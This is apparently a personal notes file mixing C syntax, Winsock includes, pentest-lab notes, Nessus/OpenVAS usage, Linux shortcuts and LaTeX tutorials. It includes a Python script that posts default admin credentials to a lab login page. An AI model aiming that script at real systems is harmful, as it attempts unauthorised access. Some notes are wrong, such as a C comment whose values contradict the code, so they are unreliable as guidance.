  y = ++x; //Set y to 11
}
Caution 2 {
    x = 1;
    y = x++; //Set y to 10 and x to 11
  }
^ ==> XOR
~ ==> NOT

x = &y; #Put the memory address of the variable y into x. Not the value of y.
y = *p2; #Assigns to variable y, the value located at the memory address pointed by p2.

#define _WINSOCK_DEPRECATED_NO_WARNINGS #Use winsock utilites and we do not want the compiler to complain about older functionalities used.
#pragma comment(lib, "Ws2_32.lib") #In order to use sockets(networking) functionality in Windows
#include <iostream> #Standard input/output utilities
#include <winsock2.h> #Network utilities
#include <stdio.h> #Standard input/output utilities(needed for perror())
#include <stdlib.h> #Standard input/output utilities
#include <dirent.h> #Directory utilities
#include <string> #String utilities

-=-=-=-=
Python3
* Extract source code from a web
	import requests
	import re
	
	url = 'http://144.126.226.105:30024/admin-login-page.php'
	
	data = {
	        'username': 'admin',
	        'password': 'password123'
	}
	
	response=requests.post(url, data=data)
	content = response.text
	
	x = re.findall('<center><strong>(.*)</strong></center>',content)[0]
	print(x)
-=-=-=-=-=-=
Machines for practicing Metasploit

    Granny/Grandpa
    Jerry
    Blue
    Lame
    Optimum
    Legacy
    Devel

-=-=-=-=
#Common Pacman commands
Command	Description
pacman -Syu <pkg>	Install (and update package list)
pacman -S <pkg>	Install only
pacman -Rsc <pkg>	Uninstall
pacman -Ss <keywords>	Search
pacman -Syu	Upgrade everything
pacman -Qe	List explictly-installed packages
pacman -Ql <pkg>	What files does this package have?
pacman -Qii <pkg>	List information on package
pacman -Qo <file>	Who owns this file?
pacman -Qs <query>	Search installed packages for keywords
pacman -Qdt	List unneeded packages
pacman -Rns $(pacman -Qdtq)	Uninstall unneeded packages
pactree <pkg>	What does pkg depend on?
pactree -r <pkg>	What depends on pkg?


wl-paste
flameshot

terminator
Split Linux Terminal Horizontally – Ctrl+Shift+O
Split Linux Terminal Vertically – Ctrl+Shift+E
Move Parent Dragbar Right – Ctrl+Shift+Right_Arrow_key
Move Parent Dragbar Left – Ctrl+Shift+Left_Arrow_key
Move Parent Dragbar Up – Ctrl+Shift+Up_Arrow_key
Move Parent Dragbar Down – Ctrl+Shift+Down_Arrow_key
Hide/Show Scrollbar – Ctrl+Shift+s
Search for a Keyword – Ctrl+Shift+f
Move to Next Terminal – Ctrl+Shift+N or Ctrl+Tab
Move to the Above Terminal – Alt+Up_Arrow_Key
Move to the Below Terminal – Alt+Down_Arrow_Key
Move to the Left Terminal – Alt+Left_Arrow_Key
Move to the Right Terminal – Alt+Right_Arrow_Key
Copy a text to clipboard – Ctrl+Shift+c
Paste a text from Clipboard – Ctrl+Shift+v
Close the Current Terminal – Ctrl+Shift+w
Quit the Terminator – Ctrl+Shift+q
Toggle Between Terminals – Ctrl+Shift+x
Open New Tab – Ctrl+Shift+t
Move to Next Tab – Ctrl+page_Down
Move to Previous Tab – Ctrl+Page_up
Increase Font size – Ctrl+(+)
Decrease Font Size – Ctrl+(­)
Reset Font Size to Original – Ctrl+0
Toggle Full-Screen Mode – F11
Reset Terminal – Ctrl+Shift+R
Reset Terminal and Clear Window – Ctrl+Shift+G
Remove all the terminal grouping – Super+Shift+t
Group all Terminal into one – Super+g
Super is a key with the windows logo right of left CTRL


-=-=-=-=
[+] Penetration testing standards
> PTES
> OSSTMM
>NIST
> OWASP
 WSTG
 MSTG
 FIRMWARE security testing methology

eyewitness => nessus results:wq

[+] Exporting Nessus Scans
    > Nessus also gives the option to export scans into two formats Nessus (scan.nessus) or Nessus DB (scan.db). The .nessus file is an .xml file and includes a copy of the scan settings and plugin outputs. The .db file contains the .nessus file and the scan's KB, plugin Audit Trail, and any scan attachments. More information about the KB and Audit Trail can be found here => https://community.tenable.com/s/article/What-is-included-in-a-nessus-db-file
    > Scripts such as the nessus-report-downloader(https://raw.githubusercontent.com/eelsivart/nessus-report-downloader/master/nessus6-report-downloader.rb) can be used to quickly download scan results in all available formats from the CLI using the Nessus REST API:

[+] Network Impact
    > It is also essential to keep in mind the potential impact of vulnerability scanning on a network, especially on low bandwidth or congested links. This can be measured using vnstat
        sudo apt install vnstat 
        sudo vnstat -l -i eth0
[+] OpenVas
    > m1l0js@htb[/htb]$ sudo apt-get update && apt-get -y full-upgrade
    > m1l0js@htb[/htb]$ sudo apt-get install gvm && openvas
    > m1l0js@htb[/htb]$ gvm-start

    * Reporting
        + We will export our results in XML and use the openvasreporting(https://github.com/TheGroundZero/openvasreporting) tool by the TheGroundZero. The openvasreporting tool offers various options when generating output. We are using the standard option for an Excel file for this report.
        m1l0js@htb[/htb]$ python3 -m openvasreporting -i report-2bf466b5-627d-4659-bea6-1758b43235b1.xml -f xlsx



-=-=-=
Using APT with HTTPS
apt-get (and other package manipulation commands, which are a front-end to the same APT libraries) can use HTTP, HTTPS and FTP (and mounted filesystems). If you specify https:// URLs in /etc/apt/sources.list and /etc/apt/sources.list.d/*, then APT will use HTTPS.

APT verifies the signature of packages. So you do not need to have a form of transportation that provides data authentication. If an attacker modifies the files you're downloading, this will be noticed. Using a signature verification is better than using an HTTPS connection, because it'll detect an attack on the server you're downloading from, not just an attack in transit.

More precisely, the (simplified) data flow for a package is the following:

    The package is produced on a build machine.
    The package is signed on the build machine.
    The signed package is copied to a download mirror.
    You download the package.

HTTPS ensures that step 4 happens correctly. The package signatures ensure that steps 2 to 4 happen correctly.

In fact, there is one small benefit to HTTPS for step 4: the package signatures only ensure that the package is authentic. An attacker in step 4 could impersonate a legitimate server and serve stale versions of the package. For example, the attacker could prevent you from downloading any security updates, in the hope of exploiting a vulnerability on your machine that you would have patched if it wasn't for the attack. This isn't a very realistic scenario, because it requires an active attacker (so that would have to be someone in control of your Internet connection), but it could happen in principle.

The other benefit to HTTPS would be if you're trying to hide the fact that you're downloading Ubuntu packages from someone snooping on your network connection. Even then, the eavesdropper could see what host you're connecting to; if you connect to an Ubuntu mirror and download hundreds of megabytes, it's clear that you're downloading Ubuntu packages. The eavesdropper could also mostly figure out which packages you're downloading from the size of the files. So HTTPS would only be useful if you're downloading from a server that also offers other files of similar size — I don't see any point except for third-party packages, and only in very unusual circumstances.

To reiterate: the usual benefit of HTTPS, which is that you know you're connected to the real server, is useless when you're downloading Ubuntu packages. The signature verification on packages gives a stronger guarantee than what HTTPS can provide.


-=-=-
[+] Linux keyboard shortcuts
Shortcut	Action
Bash Navigation	
Ctrl + A	Move to the start of the command line
Ctrl + E	Move to the end of the command line
Ctrl + F	Move one character forward
Ctrl + B	Move one character backward
Ctrl + XX	Switch cursor position between start of the command line and the current position
Ctrl + ] + x	Moves the cursor forward to next occurrence of x
Alt + F / Esc + F	Moves the cursor one word forward
Alt + B / Esc + B	Moves the cursor one word backward
Alt + Ctrl + ] + x	Moves cursor to the previous occurrence of x
Bash Control/Process	
Ctrl + L	Similar to clear command, clears the terminal screen
Ctrl + S	Stops command output to the screen
Ctrl + Z	Suspends current command execution and moves it to the background
Ctrl + Q	Resumes suspended command
Ctrl + C	Sends SIGI signal and kills currently executing command
Ctrl + D	Closes the current terminal
Bash History	
Ctrl + R	Incremental reverse search of bash history
Alt + P	Non-incremental reverse search of bash history
Ctrl + J	Ends history search at current command
Ctrl + _	Undo previous command
Ctrl + P / Up arrow	Moves to previous command
Ctrl + N / Down arrow	Moves to next command
Ctrl + S	Gets the next most recent command
Ctrl + O	Runs and re-enters the command found via Ctrl + S and Ctrl + R
Ctrl + G	Exits history search mode
!!	Runs last command
!*	Runs previous command except its first word
!*:p	Displays what !* substitutes
!x	Runs recent command in the bash history that begins with x
!x:p	Displays the x command and adds it as the recent command in history
!$	Same as OPTION+., brings forth last argument of the previous command
!^	Substitutes first argument of last command in the current command
!$:p	Displays the word that !$ substitutes
^123^abc	Replaces 123 with abc
!n:m	Repeats argument within a range (i.e, m 2-3)
!fi	Repeats latest command in history that begins with fi
!n	Run nth command from the bash history
!n:p	Prints the command !n executes
!n:$	Repeat arguments from the last command (i.e, from argument n to $)
Bash Editing	
Ctrl + U	Deletes before the cursor until the start of the command
Ctrl + K	Deletes after the cursor until the end of the command
Ctrl + W	Removes the command/argument before the cursor
Ctrl + D	Removes the character under the cursor
Ctrl + H	Removes character before the cursor
Alt + D	Removes from the character until the end of the word
Alt + Backspace	Removes from the character until the start of the word
Alt + . / Esc+.	Uses last argument of previous command
Alt + <	Moves to the first line of the bash history
Alt + >	Moves to the last line of the bash history
Esc + T	Switch between last two words before cursor
Alt + T	Switches current word with the previous
Bash Information	
TAB	Autocompletes the command or file/directory name
~TAB TAB	List all Linux users
Ctrl + I	Completes the command like TAB
Alt + ?	Display files/folders in the current path for help
Alt + *	Display files/folders in the current path as parameter


-=-=-=

LaTex
> https://latex-tutorial.com/tutorials/tables/
> An environment is simply an area of your document where certain typesetting rules apply. It is possible (and usually necessary) to have multiple environments in a document, but it is imperative the document environment is the topmost environment. The following code shows how environments can be used:
% Valid:
\begin{document}
  \begin{environment1}
    \begin{environment2}
    \end{environment2}
  \end{environment1}
\end{document}



    A document has a preamble and document part
    The document environment must be defined
    Commands beginning with a backslash \, environments have a begin and end tag
    Useful settings for pagenumbering:
        gobble – no numbers
        arabic – arabic numbers
        roman – roman numbers


\section{}
\subsection{}
\subsubsection{}

\paragraph{}
\subparagraph{}


    LaTeX uses the commands \section, \subsection and \subsubsection to define sections in your document
    The sections will have successive numbers and appear in the table of contents
    Paragraphs are not numbered and thus don’t appear in the table of contents

    Packages add new functions to LaTeX
    All packages must be included in the preamble
    Packages add features such as support for pictures, links and bibliography

Setting the float by adding [h!] behind the figure environment \begin tag will force the figure to be shown at the location in the document. Possible values are:

    h (here) – same location
    t (top) – top of page
    b (bottom) – bottom of page
    p (page) – on an extra page
    ! (override) – will force the specified location
> The float package (\usepackage{float}) allows to set the option to [H], which is even stricter than [h!].

#Bassic formating
Some text with \emph{emphasis and \emph{nested} content}.
Some text with \textit{italic and \textit{nested} content}.

#Managing text
:6,10s/<search_string>/<replace_string>/g | 14,18&&
:6,10s/<search_string>/<replace_string>/g | :14,18&& | :20,23&& | :28,31&& //The : on the subsequent commands is optional.
:for range in split('6,10 14,18')| exe range 's/<search_string>/<replace_string>/g' | endfor

# Multiple images / subfigures in LaTeX
    
%...
\begin{figure}[h!]
  \centering
  \begin{subfigure}[b]{0.2\linewidth}
    \includegraphics[width=\linewidth]{coffee.jpg}
     \caption{Coffee.}
  \end{subfigure}
  \begin{subfigure}[b]{0.2\linewidth}
    \includegraphics[width=\linewidth]{coffee.jpg}
    \caption{More coffee.}
  \end{subfigure}
  \begin{subfigure}[b]{0.2\linewidth}
    \includegraphics[width=\linewidth]{coffee.jpg}
    \caption{Tasty coffee.}
  \end{subfigure}
  \begin{subfigure}[b]{0.5\linewidth}
    \includegraphics[width=\linewidth]{coffee.jpg}
    \caption{Too much coffee.}
  \end{subfigure}
  \caption{The same cup of coffee. Multiple times.}
  \label{fig:coffee3}
\end{figure}
%...



    Use the graphicx package and figure environment to embed pictures
    Pictures will be numbered automatically
    Change the width of your image by using \includegraphics[width=\linewidth]{}
    Refer to pictures in your document by setting a \label and using the \ref tag
    Set the position of your image by adding a float option such as [h!]
    If you want to show multiple figures next to each other, use the subcaption package and the subfigure environment

> Table of contents


\documentclass{article}

\begin{document}

\tableofcontents
\newpage

\section{Section}

Dummy text

\subsection{Subsection}

Dummy text

\end{document}




> List of figures/tables
\begin{document}
...
\begin{figure}
  \caption{Dummy figure}
\end{figure}

\begin{table}
  \caption{Dummy table}
\end{table}
...
\begin{appendix}
  \listoffigures
  \listoftables
\end{appendix}

\end{document}

> Depth
% ...

\setcounter{tocdepth}{1} % Show sections
%\setcounter{tocdepth}{2} % + subsections
%\setcounter{tocdepth}{3} % + subsubsections
%\setcounter{tocdepth}{4} % + paragraphs
%\setcounter{tocdepth}{5} % + subparagraphs

\begin{document}
%...
\tableofcontents
%...
\end{document}

> If you don’t want to change the depth for all sections, you can also adjust the tocdepth for each section individually. In this case you don’t have to set the tocdepth before the section which should have more or less depth

%...
\begin{document}
%...
\addtocontents{toc}{\setcounter{tocdepth}{1}} % Set depth to 1
\section{Another section}
\subsection{Subsection}
\subsubsection{Subsubsection}
%...
\addtocontents{toc}{\setcounter{tocdepth}{3}} % Reset to default (3)
\end{document}

> Spacing

If you’re not happy with the spacing of the headings in your table of content, the easiest way of changing the spacing of your table of contents (and document in general) is by using the setspace package. First add \usepackage{setspace} to your preamble:
%...
\usepackage{setspace}
%...
\begin{document}
%...


    Autogenerate a table of content using \tableofcontents
    Create lists of your figures and tables with \listoffigures and \listoftables
    Always compile twice to see the changes
    Globally change the depth with \setcounter{tocdepth}{X}; X = {1,2,3,4,5}
    For single sections use \addtocontents{toc}{\setcounter{tocdepth}{X}} instead.

--=-=
Creating a .bib file
Using BibTeX

After creating the bibtex file, we have to tell LaTeX where to find our bibliographic database. For BibTeX this is not much different from printing the table of contents. We just need the commands \bibliography which tells LaTeX the location of our .bib file and \bibliographystyle which selects one of various bibliographic styles.
\documentclass{article}
\begin{document}
Random citation \cite{DUMMY:1} embeddeed in text.
\newpage
\bibliography{lesson7a1} 
\bibliographystyle{ieeetr}
\end{document}

Autogenerate footnotes in LATEX
using BibLaTeX

The abilities of BibTeX are limited to basic styles as depicted in the examples shown above. Sometimes it is necessary to cite all literature in footnotes and maintaining all of them by hand can be a frustrating task. At this point BibLaTeX kicks in and does the work for us. The syntax varies a bit from the first document. We now have to include the biblatex package and use the \autocite and \printbibliography command. It is crucial to move the \bibliography{lesson7a1} statement to the preamble of our document:
\documentclass{article}
\usepackage[backend=bibtex,style=verbose-trad2]{biblatex}
\bibliography{lesson7a1} 
\begin{document}
Random citation \autocite[1]{DUMMY:1} embeddeed in text.
\newpage
\printbibliography
\end{document}

> The following code shows some example text and how to add a footnote with a label:
...
This is some example text\footnote{\label{myfootnote}Hello footnote}.
...

After compilation you will see the footnote appearing on the bottom of your page. It’s imperative, that the label is contained within the footnote itself, otherwise the label will refer to the section (or subsection). Footnotes are numbered automatically. If you want to refer to them later on, you can use the \ref command as follows:
...
I'm referring to footnote \ref{myfootnote}.


Your first table

Tables in LaTeX can be created through a combination of the table environment and the tabular environment. The table environment part contains the caption and defines the float for our table, i.e. where in our document the table should be positioned and whether we want it to be displayed centered. The \caption and \label commands can be used in the same way as for pictures. The actual content of the table is contained within the tabular environment.

The tabular environment uses ampersands & as column seperators and newline symbols \\ as row seperators. The vertical lines separating the columns of our table (|) are passed as an argument to the tabular environment (e.g. \begin{tabular}{l|c|r} ) and the letters tell whether we want to align the content to the left (l), to the center (c) or to the right (r) for each column. There should be one letter for every column and a vertical line in between them or in front of them, if we want a vertical line to be shown in the table. Row seperators can be added with the \hline command.

\documentclass{article}

\begin{document}

\begin{table}[h!]
  \begin{center}
    \caption{Your first table.}
    \label{tab:table1}
    \begin{tabular}{l|c|r} % <-- Alignments: 1st column left, 2nd middle and 3rd right, with vertical lines in between
      \textbf{Value 1} & \textbf{Value 2} & \textbf{Value 3}\\
      $\alpha$ & $\beta$ & $\gamma$ \\
      \hline
      1 & 1110.1 & a\\
      2 & 10.1 & b\\
      3 & 23.113231 & c\\
    \end{tabular}
  \end{center}
\end{table}

\end{document}


-=
Align numbers at decimal point

The first thing we have to do is to include the siunitx package in our preamble and use the command \sisetup to tell the package how many digital places it should display:
%...
\usepackage{siunitx} % Required for alignment
\sisetup{
  round-mode          = places, % Rounds numbers
  round-precision     = 2, % to 2 places
}
\begin{document} 
%...






















